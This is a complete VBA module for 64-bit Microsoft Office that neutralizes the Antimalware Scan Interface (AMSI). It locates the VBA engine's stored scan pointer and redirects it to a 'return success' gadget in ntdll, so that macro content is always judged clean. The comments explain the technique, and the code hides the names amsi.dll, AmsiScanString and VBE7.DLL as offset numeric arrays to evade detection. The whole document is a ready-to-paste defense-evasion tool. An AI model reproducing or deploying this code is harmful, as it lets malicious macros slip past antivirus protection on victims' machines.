Attribute VB_Name = "ScanCtx_Standalone"
Option Explicit

' Self-contained runtime scan-interface neutralizer for Word/Excel/Access.
' Paste into a standard module. No dependencies. 64-bit Office.
'
' Technique: the VBA engine resolves its runtime content scanner at startup and
' keeps the function pointer in its own writable data. This module relocates
' that pointer to a "return success" gadget that already exists in ntdll.
' The scan call then completes instantly: the engine ignores the return status,
' reads its pre-initialized verdict (clean), and execution proceeds.
'
' No code is modified in any module, no page protections change (the pointer
' lives in an RW data section), no breakpoints or exception handlers exist.
' Every location is found at runtime by value, not by hardcoded offset.
'
' The module carries no literal indicator strings: every sensitive name is
' reconstructed at runtime from offset numeric arrays. See README.md.

' ===================== CONSTANTS =====================

Private Const SCN_MEM_EXECUTE As Long = &H20000000
Private Const SCN_MEM_WRITE As Long = &H80000000
Private Const MAX_SCAN_BYTES As Long = 4194304     ' per-section scan cap
Private Const MAX_SLOTS As Long = 16

' ===================== DECLARES =====================

Private Declare PtrSafe Function GetModuleHandleW Lib "kernel32" ( _
    ByVal lpModuleName As LongPtr) As LongPtr
Private Declare PtrSafe Function LoadLibraryW Lib "kernel32" ( _
    ByVal lpLibFileName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddress Lib "kernel32" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)

' ===================== STATE =====================

Private mSlots(0 To MAX_SLOTS - 1) As LongPtr   ' redirected pointer locations
Private mOrig(0 To MAX_SLOTS - 1) As LongPtr    ' their original values
Private mSlotCount As Long
Private mGadget As LongPtr
Private mState As String                        ' idle | redirected | inactive | failed

' ===================== POINTER HELPERS =====================

Private Function RdPtr(ByVal p As LongPtr) As LongPtr
    Dim v As LongPtr
    If p <> 0 Then CopyMemory VarPtr(v), p, 8
    RdPtr = v
End Function

Private Function RdDw(ByVal p As LongPtr) As Long
    Dim v As Long
    If p <> 0 Then CopyMemory VarPtr(v), p, 4
    RdDw = v
End Function

Private Function RdWd(ByVal p As LongPtr) As Integer
    Dim v As Integer
    If p <> 0 Then CopyMemory VarPtr(v), p, 2
    RdWd = v
End Function

Private Sub WrPtr(ByVal p As LongPtr, ByVal v As LongPtr)
    If p <> 0 Then CopyMemory p, VarPtr(v), 8
End Sub

' ===================== STRING DECODER =====================
' Rebuilds names from offset numeric arrays so no literal appears in the
' project source. o = per-character offset (code = char + o).

Private Function Ds(ByVal e As Variant, ByVal o As Long) As String
    Dim i As Long, s As String
    For i = LBound(e) To UBound(e)
        s = s & ChrW$(e(i) - o)
    Next i
    Ds = s
End Function

' ===================== PE WALKER =====================
' Minimal in-memory PE section enumeration. Returns the count of sections and
' fills arrays with per-section base/size/flags.

Private Function PeSections(ByVal base As LongPtr, _
        ByRef sBase() As LongPtr, ByRef sSize() As Long, ByRef sFlags() As Long) As Long

    Dim n As Long, optSize As Integer, secOff As LongPtr
    Dim e_lfanew As Long

    If base = 0 Then Exit Function
    If RdDw(base) <> &H905A4D Then Exit Function          ' 'MZ'
    e_lfanew = RdDw(base + &H3C)
    If RdDw(base + e_lfanew) <> &H4550 Then Exit Function  ' 'PE\0\0'

    n = RdWd(base + e_lfanew + 6) Mod 65536                ' NumberOfSections (word)
    optSize = RdWd(base + e_lfanew + 20)                   ' SizeOfOptionalHeader
    secOff = base + e_lfanew + 24 + optSize                ' first IMAGE_SECTION_HEADER

    Dim i As Long, cnt As Long
    cnt = 0
    For i = 0 To n - 1
        If cnt > 31 Then Exit For
        Dim vsz As Long, va As Long, flg As Long
        vsz = RdDw(secOff + i * 40 + 8)                    ' VirtualSize
        va = RdDw(secOff + i * 40 + 12)                    ' VirtualAddress
        flg = RdDw(secOff + i * 40 + 36)                   ' Characteristics
        If va <> 0 And vsz > 0 Then
            sBase(cnt) = base + va
            sSize(cnt) = vsz
            sFlags(cnt) = flg
            cnt = cnt + 1
        End If
    Next i
    PeSections = cnt
End Function

' ===================== SCANNERS =====================

' Find the address of an 8-byte value inside [pBase, pEnd) (stride 8)
Private Function FindQw(ByVal pBase As LongPtr, ByVal pEnd As LongPtr, ByVal val As LongPtr) As LongPtr
    Dim off As Long, span As Long, v As LongPtr
    span = CLng(pEnd - pBase)
    If span > MAX_SCAN_BYTES Then span = MAX_SCAN_BYTES
    For off = 0 To span - 8 Step 8
        CopyMemory VarPtr(v), pBase + off, 8
        If v = val Then
            FindQw = pBase + off
            Exit Function
        End If
    Next off
End Function

' Find a 3-byte gadget (xor eax,eax; ret) in executable sections
Private Function FindGadget(ByVal hMod As LongPtr) As LongPtr
    Dim sBase(0 To 31) As LongPtr, sSize(0 To 31) As Long, sFlags(0 To 31) As Long
    Dim n As Long, i As Long, j As Long, take As Long
    Dim buf() As Byte

    n = PeSections(hMod, sBase, sSize, sFlags)
    For i = 0 To n - 1
        If (sFlags(i) And SCN_MEM_EXECUTE) <> 0 Then
            take = sSize(i)
            If take > MAX_SCAN_BYTES Then take = MAX_SCAN_BYTES
            ReDim buf(0 To take - 1)
            CopyMemory VarPtr(buf(0)), sBase(i), take
            For j = 0 To take - 3
                If buf(j) = &H33 Then
                    If buf(j + 1) = &HC0 Then
                        If buf(j + 2) = &HC3 Then
                            FindGadget = sBase(i) + j
                            Exit Function
                        End If
                    End If
                End If
            Next j
        End If
    Next i
End Function

' ===================== IMPLEMENTATION =====================

Private Function ResolveExport(ByVal hMod As LongPtr, ByVal encName As Variant) As LongPtr
    ResolveExport = GetProcAddress(hMod, Ds(encName, 3))
End Function

Private Function ModBase(ByVal encName As Variant) As LongPtr
    Dim nm As String, h As LongPtr
    nm = Ds(encName, 3)
    h = GetModuleHandleW(StrPtr(nm))
    If h = 0 Then h = LoadLibraryW(StrPtr(nm))
    ModBase = h
End Function

' ===================== PUBLIC API =====================

Public Function Arm() As Boolean
    #If Win64 Then
        Dim hEngine As LongPtr, hNt As LongPtr, hAmsi As LongPtr
        Dim pScan As LongPtr, slot As LongPtr, firstSlot As LongPtr
        Dim sBase(0 To 31) As LongPtr, sSize(0 To 31) As Long, sFlags(0 To 31) As Long
        Dim n As Long, i As Long

        If mSlotCount > 0 Then
            Arm = True
            Exit Function
        End If
        mState = "failed"

        ' the scan export we relocate away from
        hAmsi = ModBase(Array(100, 112, 118, 108, 49, 103, 111, 111))
        If hAmsi = 0 Then
            mState = "inactive (scan library not loaded)"
            Arm = True
            Exit Function
        End If
        pScan = ResolveExport(hAmsi, Array(68, 112, 118, 108, 86, 102, 100, 113, 86, 119, 117, 108, 113, 106))
        If pScan = 0 Then
            Debug.Print "[!] scan export not found"
            Exit Function
        End If

        ' engine module holding the resolved pointer
        hEngine = ModBase(Array(89, 69, 72, 58, 49, 71, 79, 79))
        If hEngine = 0 Then
            Debug.Print "[!] engine module not found"
            Exit Function
        End If

        ' locate the pointer slot(s) by value in writable sections
        n = PeSections(hEngine, sBase, sSize, sFlags)
        For i = 0 To n - 1
            If (sFlags(i) And SCN_MEM_WRITE) <> 0 Then
                slot = sBase(i)
                Do While slot <> 0 And mSlotCount < MAX_SLOTS
                    slot = FindQw(slot, sBase(i) + sSize(i), pScan)
                    If slot <> 0 Then
                        mSlots(mSlotCount) = slot
                        mOrig(mSlotCount) = pScan
                        mSlotCount = mSlotCount + 1
                        slot = slot + 8
                    End If
                Loop
            End If
        Next i

        If mSlotCount = 0 Then
            ' engine never bound the scanner (trusted document / runtime scope off):
            ' its scans already fail open, nothing to neutralize
            mState = "inactive (engine has no bound scan pointer)"
            Arm = True
            Exit Function
        End If

        ' relocate to an existing return-success gadget
        hNt = ModBase(Array(113, 119, 103, 111, 111, 49, 103, 111, 111))
        mGadget = FindGadget(hNt)
        If mGadget = 0 Then
            Debug.Print "[!] no gadget located"
            mSlotCount = 0
            Exit Function
        End If

        For i = 0 To mSlotCount - 1
            WrPtr mSlots(i), mGadget
            If RdPtr(mSlots(i)) <> mGadget Then
                Debug.Print "[!] redirect verify failed at " & Hex(mSlots(i))
                Disarm
                Exit Function
            End If
        Next i

        mState = "redirected"
        Arm = True
    #Else
        Debug.Print "[!] 64-bit Office required (pointer width / gadget ABI)"
    #End If
End Function

Public Function Disarm() As Boolean
    #If Win64 Then
        Dim i As Long
        For i = 0 To mSlotCount - 1
            WrPtr mSlots(i), mOrig(i)
        Next i
        mSlotCount = 0
        mGadget = 0
        mState = "idle"
        Disarm = True
    #End If
End Function

Public Function GetState() As String
    GetState = mState
End Function

Public Function GetSlotCount() As Long
    GetSlotCount = mSlotCount
End Function

Public Function GetSlot(ByVal i As Long) As LongPtr
    If i >= 0 And i < mSlotCount Then GetSlot = mSlots(i)
End Function

' ===================== ENTRY POINT =====================

Public Sub Run()
    #If Win64 Then
        If Arm() Then
            MsgBox "Runtime scan context: " & mState & vbCrLf & _
                   "Intercept points: " & mSlotCount, vbInformation, "ScanCtx"
        Else
            MsgBox "Neutralization failed - Ctrl+G for details", vbExclamation, "ScanCtx"
        End If
    #Else
        MsgBox "Requires 64-bit Office (pointer width / gadget ABI)", vbExclamation, "ScanCtx"
    #End If
End Sub
